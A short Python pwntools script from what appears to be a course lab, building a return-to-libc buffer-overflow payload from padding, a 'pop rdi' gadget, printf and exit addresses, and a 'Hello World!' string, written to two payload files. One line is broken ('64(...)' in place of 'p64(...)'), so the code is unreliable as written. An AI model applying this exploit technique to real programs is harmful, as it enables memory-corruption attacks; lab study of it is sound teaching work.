#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5

from pwn import *

lenfill = 65 #buffer length - 8

# Hello World! payload - designed by Oka, 2014
payload = b'Hello World!'

# Set up return address
storedRBP = b'22222222'

storedRIP = p64(0x00007ffff7b37828) # from ropsearch "pop rdi" libc

printf = p64(0x7ffff7a62800) # p printf

exit = 64(0x7ffff7a47030) # p exit for clean exit


payload_address_gdb = p64(0x7fffffffdea8) #Info frame shows rbp at 0x7fffffffde80 after overflowinhg. payload should be place 40 bytes away (5 * 8). Refer to below to understand why is it 5.

payload_address = p64(0x7fffffffdee8) #Info frame shows rbp at 0x7fffffffdec0 after overflowinhg. payload should be place 40 bytes away (5 * 8).  Refer to below to understand why is it 5.

with open('payload_returntolibc_gdb','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIP + payload_address_gdb + printf + exit + payload + b'\n') # for memory access 

with open('payload_returntolibc_','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIP + payload_address + printf + exit + payload + b'\n') # for memory access 